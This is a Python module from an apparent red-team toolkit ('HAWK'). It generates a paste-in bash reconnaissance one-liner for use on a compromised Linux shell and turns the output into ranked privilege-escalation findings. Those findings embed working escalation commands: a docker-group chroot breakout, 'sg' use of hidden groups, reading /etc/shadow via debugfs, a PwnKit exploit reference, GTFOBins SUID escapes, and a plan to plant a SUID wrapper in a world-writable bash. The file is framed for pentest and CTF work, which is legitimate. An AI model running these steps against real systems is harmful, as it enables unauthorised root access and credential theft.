# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK — Post-RCE quick-recon snippet generator + output analyzer.

Why this module exists
──────────────────────
After landing a shell on a Linux target via any path (RCE exploit,
reverse shell from a phishing payload, valid SSH credentials harvested
from a leaked .env file, post-AD-pivot, …) the operator needs to
quickly know:

  • Who am I really, and what privileges do I really have?
  • Are there hidden group memberships the shell didn't load?
    (THE classic gotcha — `id` lies in non-login shells because
    PAM didn't run, supplementary groups aren't inherited.)
  • Are there obvious privilege escalation primitives?
    (sudo NOPASSWD, SUID, capabilities, writable bash, cron, kernel)

HAWK isn't connected to the operator's reverse-shell xterm — that
shell lives outside the GUI.  So this module is a **copy-paste
helper**: it generates a self-contained bash snippet to run in the
shell, then parses the output the operator pastes back.  Deliberately
agnostic to *how* the shell was obtained (CTF / internal / external
pentest / red team) — the output is what matters, not the path.

Output of the analyzer
──────────────────────
A list of finding dicts ready to feed into Target Intel via
``add_auto_finding``.  Each finding has ``title``, ``description``,
``severity``, ``source`` ("post-rce-recon").  The most important
finding type is the **hidden-group** detection: when ``id`` shows
fewer groups than ``getent`` says the user belongs to, we emit a
HIGH finding with the ``sg <group> -c '<cmd>'`` workaround so the
operator can immediately escalate.

The snippet uses ASCII section markers so the parser can latch onto
exact sub-blocks even when other shell noise gets pasted in by
accident.  Every section is wrapped in ``<<<SECTION:NAME>>>`` /
``<<<END:NAME>>>`` lines.
"""

from __future__ import annotations

import re
from typing import Iterable


# Privileged groups across distros — membership in any of these is a
# direct (or near-direct) path to root.  Order matters: we report
# the highest-impact finding first.
_PRIV_GROUPS: list[tuple[str, str, str]] = [
    # (group, severity, action)
    ("sudo",     "high",
     "Member of `sudo` — try `sudo -l` first; if any NOPASSWD or "
     "broad rules, escalate immediately."),
    ("wheel",    "high",
     "Member of `wheel` (RHEL/CentOS sudo equivalent) — try "
     "`sudo -l`."),
    ("admin",    "high",
     "Member of `admin` — legacy Ubuntu sudo group, often equivalent "
     "to wheel."),
    ("docker",   "critical",
     "Member of `docker` — full container control means trivial root "
     "via `docker run -v /:/hostfs <image> chroot /hostfs sh` or "
     "`docker run -v /:/hostfs <image> cat /hostfs/root/root.txt` "
     "(replace `<image>` with one from `docker images`)."),
    ("lxd",      "critical",
     "Member of `lxd` — same pattern as docker, root via "
     "privileged container.  Search 'lxd privesc' on hacktricks."),
    ("lxc",      "critical",
     "Member of `lxc` — privileged-container path to root."),
    ("disk",     "high",
     "Member of `disk` — raw access to block devices.  "
     "`debugfs /dev/sda1` can read any file including /etc/shadow."),
    ("video",    "low",
     "Member of `video` — niche, sometimes lets you read framebuffer "
     "or capture keystrokes from console."),
    ("kvm",      "low",
     "Member of `kvm` — VM management, rarely a direct root path."),
    ("adm",      "medium",
     "Member of `adm` — read access to many `/var/log/*` files; "
     "scan for credentials in auth.log / syslog."),
    ("shadow",   "critical",
     "Member of `shadow` — direct read of /etc/shadow → offline "
     "crack root."),
    ("backup",   "high",
     "Member of `backup` — read access to most files for backup; "
     "often equivalent to root-read."),
    ("operator", "low",
     "Member of `operator` — historically backup/disk maintenance.  "
     "Distro-specific; check what files are group-owned by operator."),
]


_SECTION_MARK = "<<<SECTION:{}>>>"
_END_MARK     = "<<<END:{}>>>"


def generate_snippet() -> str:
    """Return a self-contained bash one-liner block suitable for pasting
    into any Linux shell (interactive, RCE-spawned, web shell with
    cmd parameter, …).  Output is wrapped in ``___HAWK_BEGIN___`` /
    ``___HAWK_END___`` so the analyzer can locate the run cleanly
    even when paste includes prompts before/after.

    Each sub-section is wrapped in ``<<<SECTION:X>>>`` markers so the
    analyzer doesn't have to guess at the structure.  We use ``echo``
    instead of `printf` for portability (busybox / dash compatible).
    """
    cmds: list[str] = []
    cmds.append("echo ___HAWK_BEGIN___")

    def section(name: str, lines: Iterable[str]) -> None:
        # IMPORTANT: marker tokens MUST be single-quoted in the
        # echo line.  Bash treats `<<<` as a here-string operator
        # and `>>>` as an (invalid) redirection — pasting the bare
        # `echo <<<SECTION:WHOAMI>>>` form produced
        #     bash: syntax error near unexpected token `>'
        # on every reverse shell.  Single quotes protect the whole
        # marker from any shell expansion / redirection parsing.
        # The output that lands in the captured text is identical
        # to before (echo strips the quotes), so the analyzer's
        # `_extract_section` finds the literal marker unchanged.
        cmds.append(f"echo '{_SECTION_MARK.format(name)}'")
        cmds.extend(lines)
        cmds.append(f"echo '{_END_MARK.format(name)}'")

    section("WHOAMI", [
        "id 2>/dev/null",
        "whoami 2>/dev/null",
        "hostname 2>/dev/null",
        "uname -a 2>/dev/null",
    ])

    # NSS group membership (the "id lies" detection).  We probe each
    # privileged group with `getent` — this consults /etc/group +
    # NSS sources and is unaffected by whether the current shell
    # loaded supplementary groups.
    priv_group_names = " ".join(g for g, _, _ in _PRIV_GROUPS)
    # Exact match on the member list, NOT `grep -wq "$_U"` over the
    # whole getent line.  grep's word characters are [A-Za-z0-9_], so
    # `-w svc` matched the member `svc-backup` (the `-` counts as a
    # boundary) and the group name field matched a same-named user —
    # both produced a phantom membership, which the analyzer then
    # reported as a CRITICAL "id lies / hidden group".
    # `cut -f4` is the member list; the case glob compares whole
    # comma-separated names.  POSIX sh, no awk, busybox-safe.
    section("NSS_GROUPS", [
        f"_U=$(id -un 2>/dev/null); for g in {priv_group_names}; do "
        f"_M=$(getent group \"$g\" 2>/dev/null | cut -d: -f4); "
        f"case \",$_M,\" in *\",$_U,\"*) echo \"$g\" ;; esac; done",
    ])

    section("SUDO_LIST", [
        "sudo -n -l 2>&1 | head -40",
    ])

    section("SUID", [
        "find / -perm -4000 -type f 2>/dev/null | head -40",
    ])

    section("CAPS", [
        "getcap -r / 2>/dev/null | head -30",
    ])

    section("CRON", [
        "cat /etc/crontab 2>/dev/null",
        "ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ "
        "2>/dev/null | head -40",
    ])

    section("WRITABLE_BIN", [
        "ls -l /usr/bin/bash /bin/bash /bin/sh /usr/bin/sudo "
        "/usr/bin/su 2>/dev/null",
    ])

    section("KERNEL", [
        "uname -r 2>/dev/null",
        "cat /etc/os-release 2>/dev/null | head -6",
    ])

    section("SOCKETS", [
        "ls -l /var/run/docker.sock /var/run/lxd.sock 2>/dev/null",
        # If docker socket is reachable, list locally-pulled images
        # so the privesc cheat sheet can suggest a real image name
        # in its docker-breakout commands.  Critical on lab/CTF/
        # air-gapped targets where `docker pull alpine` will fail
        # for lack of internet (this is exactly what bit us on
        # Kobold the first time).  We try both with and without
        # `sg docker` so we catch the case where the user is in
        # the docker group but `id` doesn't show it (the "id lies"
        # trap — same root cause as the NSS_GROUPS section).
        "(test -S /var/run/docker.sock && "
        "(docker image ls 2>/dev/null "
        "|| sg docker -c 'docker image ls' 2>/dev/null "
        "|| echo '[docker] not reachable as this user')) "
        "| head -20",
    ])

    # INTERNET reachability — useful signal for privesc tools that
    # would otherwise try to `docker pull` / `wget exploit.c`
    # blindly.  3-second curl timeout, HTTPS only, returns just
    # the HTTP status code (no body).  200/30x = internet OK,
    # blank/000/timeout = isolated lab/CTF/internal target.
    section("INTERNET", [
        "curl -s -m 3 -o /dev/null -w 'http_code=%{http_code}\\n' "
        "https://1.1.1.1 2>/dev/null "
        "|| echo 'http_code=000'",
    ])

    cmds.append("echo ___HAWK_END___")
    # Single line, semicolons.  This way the operator can paste it
    # in any shell — including web-shell ?cmd= style — without
    # needing multi-line support.
    return "; ".join(cmds)


# ─── Analyzer ──────────────────────────────────────────────────────

def _extract_section(blob: str, name: str) -> str:
    start = blob.find(_SECTION_MARK.format(name))
    end   = blob.find(_END_MARK.format(name))
    if start == -1 or end == -1 or end < start:
        return ""
    # Skip the marker line itself.
    nl = blob.find("\n", start)
    if nl == -1 or nl >= end:
        return ""
    return blob[nl + 1:end].rstrip("\n").rstrip()


def _parse_id_groups(id_line: str) -> list[str]:
    """``id`` output: ``uid=1001(ben) gid=1001(ben) groups=1001(ben),
    37(operator)``.  Returns ['ben', 'operator']."""
    out = []
    m = re.search(r"groups=([^\s]+)", id_line)
    if not m:
        return out
    for token in m.group(1).split(","):
        gm = re.search(r"\(([^)]+)\)", token)
        if gm:
            out.append(gm.group(1))
    return out


def analyze_output(text: str) -> dict:
    """Parse pasted shell output.  Returns a dict with:

        ``user``         — whoami / id user name
        ``host``         — hostname
        ``kernel``       — uname output
        ``id_groups``    — groups visible to ``id`` in the shell
        ``nss_groups``   — privileged groups the user is in per NSS
        ``hidden_groups``— nss_groups − id_groups (the "id lies" set)
        ``findings``     — list of dicts ready for add_auto_finding
        ``parse_warnings`` — list of strings about missing sections
                              (e.g. user pasted partial output)

    The analyzer is tolerant: missing sections produce warnings, not
    exceptions.  Whatever HAS been parsed still feeds findings.
    """
    # Trim to the BEGIN/END markers if present.  Operators often paste
    # extra prompt noise before or after.
    blob = text
    b = blob.find("___HAWK_BEGIN___")
    if b != -1:
        blob = blob[b:]
    e = blob.find("___HAWK_END___")
    if e != -1:
        blob = blob[:e]

    out = {
        "user":          "",
        "host":          "",
        "kernel":        "",
        "id_groups":     [],
        "nss_groups":    [],
        "hidden_groups": [],
        # Locally-pulled docker images (parsed from the docker
        # image ls probe inside the SOCKETS section).  Empty list
        # when docker isn't reachable as the current user OR when
        # there are no images.  privesc_cheat consumes this to
        # suggest a real image name in the docker_group exploit
        # commands instead of the `alpine` placeholder that fails
        # on lab/CTF/air-gapped targets.
        "docker_images": [],
        # Internet reachability — "online" / "offline" / "unknown".
        # Privesc commands that require pull / wget / curl can be
        # gated on this so we don't tell the operator to run
        # something that will time out for 60s on Kobold.
        "internet":      "unknown",
        "findings":      [],
        "parse_warnings": [],
    }

    # WHOAMI
    who = _extract_section(blob, "WHOAMI")
    if not who:
        out["parse_warnings"].append(
            "WHOAMI section missing — output looks truncated.")
    for ln in who.splitlines():
        ln = ln.strip()
        if ln.startswith("uid="):
            out["id_groups"] = _parse_id_groups(ln)
            mu = re.search(r"uid=\d+\(([^)]+)\)", ln)
            if mu and not out["user"]:
                out["user"] = mu.group(1)
        elif ln and "Linux" in ln and out["kernel"] == "":
            out["kernel"] = ln
        elif ln and "." in ln and out["host"] == "" and " " not in ln:
            out["host"] = ln
    # Fallback whoami / hostname
    for ln in who.splitlines():
        ln = ln.strip()
        if not out["user"] and ln and not ln.startswith("uid=") \
                and not ln.startswith("Linux") and "." not in ln \
                and " " not in ln:
            out["user"] = ln

    # NSS_GROUPS
    nss = _extract_section(blob, "NSS_GROUPS")
    out["nss_groups"] = [
        g.strip() for g in nss.splitlines() if g.strip()
    ]

    # Compute hidden groups: user is in those per NSS but `id` didn't
    # show them.  This is the "id lies" detection.
    id_set = set(out["id_groups"])
    out["hidden_groups"] = [
        g for g in out["nss_groups"] if g not in id_set
    ]

    # ── Emit findings ──────────────────────────────────────────────
    target_label = (out["host"] or out["user"] or "target")

    # Hidden-group findings — one per detected hidden privileged group.
    by_severity = {"critical": 0, "high": 1, "medium": 2,
                   "low": 3, "info": 4}
    for g_name, g_sev, g_action in _PRIV_GROUPS:
        if g_name not in out["hidden_groups"]:
            continue
        out["findings"].append({
            "title":       (f"Hidden group membership ({g_name}) on "
                            f"{target_label}"),
            "description": (
                f"The user `{out['user']}` is a member of `{g_name}` "
                f"per NSS (`getent group {g_name}`) but the current "
                f"shell did not load the group (it's missing from "
                f"`id` output).  This is the classic Linux non-login "
                f"shell gotcha: PAM doesn't run on RCE-spawned "
                f"shells, so supplementary groups aren't inherited.\n"
                f"\n"
                f"Why it matters: tools like `docker`, `sudo` etc. "
                f"check the EFFECTIVE group set, not the NSS one.\n"
                f"\n"
                f"How to use the membership anyway: prefix the "
                f"command with `sg {g_name} -c \"<cmd>\"`.  Example:\n"
                f"  sg {g_name} -c \"id\"   # confirms the switch\n"
                f"\n"
                f"{g_action}\n"
                f"\n"
                f"NSS-confirmed groups: {', '.join(out['nss_groups'])}\n"
                f"Visible to `id`:       {', '.join(out['id_groups'])}"
            ),
            "severity":    g_sev,
            "source":      "post-rce-recon",
        })

    # Visible privileged groups — already known via id, but worth
    # surfacing with the action hint.  Lower severity since the user
    # already knows.
    visible_priv = [g for g, _, _ in _PRIV_GROUPS if g in id_set]
    for g_name, g_sev, g_action in _PRIV_GROUPS:
        if g_name not in visible_priv:
            continue
        out["findings"].append({
            "title":       (f"Privileged group ({g_name}) visible "
                            f"on {target_label}"),
            "description": (
                f"The user `{out['user']}` is in `{g_name}` and the "
                f"membership is loaded in the current shell (visible "
                f"in `id`).  No `sg` workaround needed — commands run "
                f"natively with the group's privileges.\n"
                f"\n"
                f"{g_action}"
            ),
            "severity":    g_sev,
            "source":      "post-rce-recon",
        })

    # Sudo NOPASSWD
    sudo_l = _extract_section(blob, "SUDO_LIST")
    if "NOPASSWD" in sudo_l:
        nopw_lines = [ln for ln in sudo_l.splitlines()
                      if "NOPASSWD" in ln]
        out["findings"].append({
            "title":       (f"sudo NOPASSWD on {target_label}"),
            "description": (
                f"`sudo -n -l` returned NOPASSWD entries — escalate "
                f"by running the listed commands with sudo, no "
                f"password required.  Cross-reference each binary "
                f"with gtfobins.github.io for known escape "
                f"techniques.\n\nEntries:\n" +
                "\n".join(f"  {l.strip()}" for l in nopw_lines)
            ),
            "severity":    "critical",
            "source":      "post-rce-recon",
        })
    elif sudo_l and "may not run sudo" not in sudo_l \
            and "not allowed" not in sudo_l \
            and "User " in sudo_l:
        # Sudo allowed but with password — useful but not free.
        out["findings"].append({
            "title":       f"sudo allowed (with password) on {target_label}",
            "description": (
                f"`sudo -n -l` returned entries that require a "
                f"password.  Useless for direct escalation, but "
                f"valuable if you ever recover the user's password.\n"
                f"\n{sudo_l[:600]}"
            ),
            "severity":    "info",
            "source":      "post-rce-recon",
        })

    # SUID — flag known-exploitable ones
    SUID_GTFO = {
        "/usr/bin/find", "/bin/find",
        "/usr/bin/vim", "/usr/bin/nano", "/bin/nano",
        "/usr/bin/python", "/usr/bin/python3",
        "/usr/bin/perl", "/usr/bin/ruby",
        "/usr/bin/awk", "/usr/bin/gawk",
        "/usr/bin/less", "/usr/bin/more",
        "/usr/bin/cp", "/usr/bin/mv",
        "/usr/bin/tar", "/usr/bin/zip",
        "/usr/bin/env", "/usr/bin/expect",
        "/usr/bin/bash", "/bin/bash",
        "/usr/bin/dash", "/bin/dash",
        "/usr/bin/openssl",
        "/usr/bin/wget", "/usr/bin/curl",
        "/usr/bin/socat", "/usr/bin/strace",
    }
    suid_text = _extract_section(blob, "SUID")
    suid_hits = [ln.strip() for ln in suid_text.splitlines()
                 if ln.strip().startswith("/")]
    # Always emit an INFO finding when pkexec is present — it's the
    # canonical CVE-2021-4034 (PwnKit) entry point and most boxes
    # built before mid-2022 are vulnerable.  Even though pkexec
    # isn't a "gtfobins SUID" in the regular sense (the exploit is
    # via the polkit version, not direct invocation), it's the
    # single biggest privesc gimme on Linux pre-2022 and we want
    # the privesc-patterns matcher to be able to see it.
    pkexec_present = any("pkexec" in s for s in suid_hits)
    if pkexec_present:
        out["findings"].append({
            "title":       (f"pkexec present on {target_label} — "
                            f"PwnKit (CVE-2021-4034) candidate"),
            "description": (
                "/usr/bin/pkexec is installed (SUID-root).  If "
                "polkit is < 0.120 (most boxes built before "
                "Jan 2022), CVE-2021-4034 (PwnKit) gives root in "
                "seconds.  Heap layout exploit, no kernel touch — "
                "extremely reliable.  Reference PoC: "
                "https://github.com/ly4k/PwnKit"
            ),
            "severity":    "high",
            "source":      "post-rce-recon",
        })

    suid_gtfo_hits = [s for s in suid_hits if s in SUID_GTFO]
    if suid_gtfo_hits:
        out["findings"].append({
            "title":       (f"Exploitable SUID binaries on "
                            f"{target_label} ({len(suid_gtfo_hits)})"),
            "description": (
                f"The following SUID-root binaries are known to be "
                f"trivially exploitable per gtfobins.github.io:\n\n" +
                "\n".join(f"  • {s}" for s in suid_gtfo_hits) +
                "\n\nLook up each on gtfobins for the exact escape "
                "command (typically `<binary> ... -c '/bin/sh -p'` "
                "or similar).  -p preserves the SUID elevated UID."
            ),
            "severity":    "high",
            "source":      "post-rce-recon",
        })

    # Capabilities
    caps_text = _extract_section(blob, "CAPS")
    cap_priv = []
    for ln in caps_text.splitlines():
        # Match cap_setuid / cap_dac_read_search / etc. as direct
        # privesc primitives.
        if re.search(r"cap_(setuid|setgid|dac_read_search|"
                     r"sys_admin|sys_ptrace|chown)\b", ln):
            cap_priv.append(ln.strip())
    if cap_priv:
        out["findings"].append({
            "title":       f"Dangerous capabilities on {target_label}",
            "description": (
                "Files with capabilities that grant privesc primitives:\n\n"
                + "\n".join(f"  {l}" for l in cap_priv) +
                "\n\nReference: https://book.hacktricks.wiki/en/"
                "linux-hardening/privilege-escalation/linux-capabilities.html"
            ),
            "severity":    "high",
            "source":      "post-rce-recon",
        })

    # Writable bash / sudo / su (rare but devastating misconfig)
    wb_text = _extract_section(blob, "WRITABLE_BIN")
    for ln in wb_text.splitlines():
        ln = ln.strip()
        if not ln.startswith("-"):
            continue
        parts = ln.split()
        # Expect at minimum: mode, links, owner, group, size, mon,
        # day, time/year, path → 9 fields.
        if len(parts) < 9:
            continue
        mode = parts[0]
        owner, group = parts[2], parts[3]
        path = parts[-1]
        # ``-rwxrwxrwx`` = 10 chars; index 8 is the OTHERS write bit.
        if len(mode) >= 10 and mode[8] == "w":
            out["findings"].append({
                "title":       (f"World-writable critical binary "
                                f"{path} on {target_label}"),
                "description": (
                    f"`{path}` has `w` for OTHERS (`{mode}` "
                    f"{owner}:{group}).  Anyone can overwrite the "
                    f"binary.  Replace with a wrapper that copies "
                    f"itself to /tmp + sets SUID when invoked as "
                    f"root, then wait for any root process to "
                    f"invoke it (cron.hourly via run-parts is the "
                    f"common trigger).\n\n"
                    f"Caveat: requires root to actually invoke the "
                    f"binary at some point.  Slower than other paths "
                    f"if available — try sudo / docker / SUID first."
                ),
                "severity":    "high",
                "source":      "post-rce-recon",
            })

    # Sockets
    sock_text = _extract_section(blob, "SOCKETS")
    if "docker.sock" in sock_text:
        # If the socket is rw-able by current user we'd already have
        # docker group via NSS; but flag the presence regardless.
        out["findings"].append({
            "title":       f"Docker socket present on {target_label}",
            "description": (
                "Docker daemon socket is at /var/run/docker.sock.  "
                "If the user is in `docker` group (see hidden-group "
                "findings) → root via container breakout.  If not, "
                "check if the socket is world-writable (rare but "
                "happens on misconfig systems)."
            ),
            "severity":    "info",
            "source":      "post-rce-recon",
        })
    if "lxd.sock" in sock_text:
        out["findings"].append({
            "title":       f"LXD socket present on {target_label}",
            "description": (
                "LXD daemon socket at /var/run/lxd.sock.  Same "
                "pattern as docker — if user in lxd group, "
                "privileged container breakout = root."
            ),
            "severity":    "info",
            "source":      "post-rce-recon",
        })

    # Locally-pulled docker images parsed from the SOCKETS section
    # tail (`docker image ls` output).  Format we expect:
    #     REPOSITORY   TAG     IMAGE ID   CREATED   SIZE
    #     mysql        latest  f66...     ...       922MB
    # so we skip the header row and pick {REPO}:{TAG} for each line.
    # Skipped lines: empty, "[docker] not reachable", anything that
    # doesn't have at least 2 whitespace-separated tokens.
    images: list[str] = []
    for ln in sock_text.splitlines():
        ln = ln.strip()
        if (not ln
                or ln.startswith("REPOSITORY")
                or ln.startswith("[docker]")
                or ln.startswith("srw")
                or ln.startswith("-rw")
                or ln.startswith("lrw")):
            continue
        parts = ln.split()
        if len(parts) >= 2 and "/" not in parts[0][:1]:
            # parts[0] = repo, parts[1] = tag
            repo, tag = parts[0], parts[1]
            if repo and tag and tag != "TAG":
                images.append(f"{repo}:{tag}")
    out["docker_images"] = images
    if images:
        # Surface a finding so the operator (and the privesc cheat
        # sheet UI) can see at a glance what's locally available
        # without hunting in the Docker socket card.
        out["findings"].append({
            "title":       (f"Local docker images on "
                            f"{target_label} ({len(images)})"),
            "description": (
                "Pulled images already present on the target "
                "(usable for breakout WITHOUT internet access):\n\n"
                + "\n".join(f"  • {i}" for i in images[:20])
                + ("\n\n…and more" if len(images) > 20 else "")
                + "\n\nIn docker breakouts, substitute these "
                  "names for the generic `alpine` placeholder."
            ),
            "severity":    "info",
            "source":      "post-rce-recon",
        })

    # Internet reachability — used by privesc_cheat to know whether
    # to suggest pull-based or local-image-based commands.
    inet_text = _extract_section(blob, "INTERNET")
    m = re.search(r"http_code=(\d+)", inet_text)
    if m:
        code = m.group(1)
        if code in ("200", "204") or code.startswith("3"):
            out["internet"] = "online"
        elif code == "000":
            out["internet"] = "offline"
        else:
            out["internet"] = f"unknown ({code})"
        # Surface as INFO so the privesc cheat sheet can use it as
        # a routing signal without re-probing.
        if out["internet"] == "offline":
            out["findings"].append({
                "title":       (f"Target appears air-gapped "
                                f"({target_label})"),
                "description": (
                    "Outbound HTTPS to 1.1.1.1 timed out (no "
                    "http_code).  This is normal on HTB / internal "
                    "lab targets; means privesc paths that "
                    "require `docker pull`, `wget exploit.c`, or "
                    "any external download will FAIL.  Use "
                    "locally-cached resources only (see local "
                    "docker images finding above) or transfer "
                    "needed files via the existing RCE channel."
                ),
                "severity":    "info",
                "source":      "post-rce-recon",
            })

    # Re-order findings by severity so the operator sees the best
    # path first.
    out["findings"].sort(key=lambda f: by_severity.get(
        (f.get("severity") or "info").lower(), 99))

    return out


__all__ = [
    "generate_snippet",
    "analyze_output",
]
